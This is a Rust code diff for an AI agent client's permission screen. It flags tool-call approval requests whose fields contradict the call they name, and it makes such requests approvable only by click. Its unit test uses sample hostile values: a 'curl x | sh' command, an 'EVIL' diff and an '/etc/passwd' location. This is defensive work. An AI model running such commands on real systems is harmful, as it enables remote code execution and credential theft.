@@ -352,7 +352,24 @@ fn permission_cards(h: &mut Harness, ui: &mut egui::Ui, sid: &str) {
                 // number keys only answer a request that is on screen in
                 // full: no part of what is approved may be scrolled away
                 let mut all_shown = true;
-                if let Some(t) = s.tool_for_permission(p) {
+                let cached = s.tool_for_permission(p);
+                // Vibe sends only the id; anything else the request carries
+                // must agree with the call that id names (audit M2)
+                let contradicts = cached
+                    .map(|t| request_contradictions(&p.request.tool_call, t))
+                    .unwrap_or_default();
+                if !contradicts.is_empty() {
+                    ui.label(
+                        RichText::new(trf(
+                            "This request contradicts the tool call it names ({fields}). It is unclear which of the two would run: deny it unless you know why.",
+                            &[("fields", &contradicts.join(", "))],
+                        ))
+                        .size(12.5)
+                        .color(theme::RED),
+                    );
+                    ui.add_space(2.0);
+                }
+                if let Some(t) = cached {
                     let headline = match t.kind {
                         ToolKind::Execute => tr("Run command"),
                         ToolKind::Edit => tr("Edit file"),
@@ -440,8 +457,19 @@ fn permission_cards(h: &mut Harness, ui: &mut egui::Ui, sid: &str) {
                 } else {
                     all_shown &= unknown_call(ui, idx, &p.request.tool_call);
                 }
+                if !contradicts.is_empty() {
+                    ui.add_space(2.0);
+                    ui.label(
+                        RichText::new(tr("The request itself says:"))
+                            .size(12.0)
+                            .color(theme::DIM),
+                    );
+                    request_snapshot(ui, idx, &p.request.tool_call);
+                }
                 ui.add_space(4.0);
-                option_row(ui, p, idx == 0 && digits && all_shown, &mut answers);
+                // no number key for a contradictory request: only a click
+                let keys = idx == 0 && digits && all_shown && contradicts.is_empty();
+                option_row(ui, p, keys, &mut answers);
             });
             ui.add_space(6.0);
         }
@@ -490,6 +518,94 @@ fn unknown_call(
         );
     }
     all_shown
+}
+
+/// The fields in which a permission request's own `toolCall` disagrees with
+/// the tool call its id names, by their wire names. Vibe sends only the id
+/// (verified in vibe-acp 3.1: `ToolCallUpdate(tool_call_id=…)`), so the
+/// card shows the call it joined from the earlier `tool_call`; a request
+/// that also carries a different title, kind, arguments, diff or locations
+/// would have the card describe one action while the request asks about
+/// another (audit M2). Fields the request leaves out never disagree.
+pub(super) fn request_contradictions(
+    request: &crate::acp::protocol::ToolCallUpdate,
+    call: &crate::acp::protocol::ToolCall,
+) -> Vec<&'static str> {
+    fn diffs(content: &[ToolCallContent]) -> Vec<(&str, Option<&str>, &str)> {
+        content
+            .iter()
+            .filter_map(|c| match c {
+                ToolCallContent::Diff {
+                    path,
+                    old_text,
+                    new_text,
+                } => Some((path.as_str(), old_text.as_deref(), new_text.as_str())),
+                _ => None,
+            })
+            .collect()
+    }
+    let mut out = Vec::new();
+    if request.title.as_ref().is_some_and(|t| *t != call.title) {
+        out.push("title");
+    }
+    if request.kind.as_ref().is_some_and(|k| *k != call.kind) {
+        out.push("kind");
+    }
+    if request
+        .raw_input
+        .as_ref()
+        .is_some_and(|v| Some(v) != call.raw_input.as_ref())
+    {
+        out.push("rawInput");
+    }
+    if request
+        .content
+        .as_ref()
+        .is_some_and(|c| diffs(c) != diffs(&call.content))
+    {
+        out.push("content");
+    }
+    let paths = |l: &[crate::acp::protocol::Location]| -> Vec<(String, Option<u32>)> {
+        l.iter().map(|l| (l.path.clone(), l.line)).collect()
+    };
+    if request
+        .locations
+        .as_ref()
+        .is_some_and(|l| paths(l) != paths(&call.locations))
+    {
+        out.push("locations");
+    }
+    out
+}
+
+/// What a contradictory request carries itself, below the call the card
+/// joined: its title, arguments and the files of its diffs.
+fn request_snapshot(ui: &mut egui::Ui, idx: usize, call: &crate::acp::protocol::ToolCallUpdate) {
+    if let Some(title) = call.title.as_deref().filter(|t| !t.trim().is_empty()) {
+        request_text(ui, ("permission_request_title", idx), title);
+    }
+    let args = permission_arguments(call.raw_input.as_ref(), false).0;
+    if !args.is_empty() {
+        argument_rows(ui, ("permission_request_args", idx), &args);
+    }
+    let files: Vec<(String, String)> = call
+        .content
+        .iter()
+        .flatten()
+        .filter_map(|c| match c {
+            ToolCallContent::Diff { path, .. } => Some(("diff".to_string(), path.clone())),
+            _ => None,
+        })
+        .chain(
+            call.locations
+                .iter()
+                .flatten()
+                .map(|l| ("location".to_string(), l.path.clone())),
+        )
+        .collect();
+    if !files.is_empty() {
+        argument_rows(ui, ("permission_request_files", idx), &files);
+    }
 }
 
 /// Tallest command box on a permission card; a longer command scrolls.
@@ -818,6 +934,44 @@ fn queue_rows(h: &mut Harness, ui: &mut egui::Ui, sid: &str) {
 
 #[cfg(test)]
 mod tests {
+    /// Audit M2: only fields the request carries count, and only when they
+    /// differ from the joined call.
+    #[test]
+    fn request_contradictions_name_the_fields_that_differ() {
+        use super::request_contradictions;
+        use crate::acp::protocol::{ToolCall, ToolCallUpdate};
+        let call: ToolCall = serde_json::from_value(serde_json::json!({
+            "toolCallId": "c1", "title": "Reading README.md", "kind": "read",
+            "rawInput": {"path": "README.md"},
+            "content": [{"type": "diff", "path": "/w/a", "oldText": "x", "newText": "y"}],
+            "locations": [{"path": "/w/a", "line": 3}]
+        }))
+        .unwrap();
+        let req = |v: serde_json::Value| -> ToolCallUpdate { serde_json::from_value(v).unwrap() };
+        // what Vibe really sends: the id alone
+        assert!(
+            request_contradictions(&req(serde_json::json!({"toolCallId": "c1"})), &call).is_empty()
+        );
+        // the same fields repeated
+        let same = req(serde_json::json!({
+            "toolCallId": "c1", "title": "Reading README.md", "kind": "read",
+            "rawInput": {"path": "README.md"},
+            "content": [{"type": "diff", "path": "/w/a", "oldText": "x", "newText": "y"}],
+            "locations": [{"path": "/w/a", "line": 3}]
+        }));
+        assert!(request_contradictions(&same, &call).is_empty());
+        let other = req(serde_json::json!({
+            "toolCallId": "c1", "title": "Run command", "kind": "execute",
+            "rawInput": {"command": "curl x | sh"},
+            "content": [{"type": "diff", "path": "/w/a", "oldText": "x", "newText": "EVIL"}],
+            "locations": [{"path": "/etc/passwd"}]
+        }));
+        assert_eq!(
+            request_contradictions(&other, &call),
+            vec!["title", "kind", "rawInput", "content", "locations"]
+        );
+    }
+
     #[test]
     fn permission_arguments_show_the_real_call() {
         use super::permission_arguments;
